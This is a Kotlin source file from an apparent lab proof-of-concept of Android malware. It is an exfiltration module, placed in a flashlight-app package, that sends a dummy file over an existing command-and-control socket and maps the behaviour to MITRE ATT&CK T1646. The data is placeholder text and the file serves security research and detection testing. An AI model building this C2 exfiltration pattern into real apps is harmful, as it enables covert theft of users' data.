package com.utiltools.flashlight.exfil

import android.util.Log
import java.io.OutputStream
import java.time.Instant

/**
 * PoC-only. Self-built benign proof-of-concept, isolated lab only.
 * Implements ATT&CK Mobile T1646 (Exfiltration Over C2 Channel):
 * https://attack.mitre.org/techniques/T1646/
 *
 * Reuses the TLS socket opened by C2Client to send a dummy "sensitive"
 * file — no real user data is ever touched. Logs the exfil timestamp for
 * evidence capture (cross-referenced against the Wireshark pcap).
 */
object ExfilModule {

    private const val TAG = "PoC-T1646-Exfil"
    private const val DUMMY_FILENAME = "dummy_sensitive_file.txt"
    private val DUMMY_CONTENTS =
        "PoC dummy data — not real user content. Lab exfil demonstration only."
            .toByteArray()

    fun exfil(c2Out: OutputStream) {
        val timestamp = Instant.now().toString()
        val header = "EXFIL:$DUMMY_FILENAME\n"

        c2Out.write(header.toByteArray())
        c2Out.write(DUMMY_CONTENTS)
        c2Out.flush()

        Log.i(
            TAG,
            "exfil_sent file=$DUMMY_FILENAME bytes=${DUMMY_CONTENTS.size} timestamp=$timestamp"
        )
    }
}
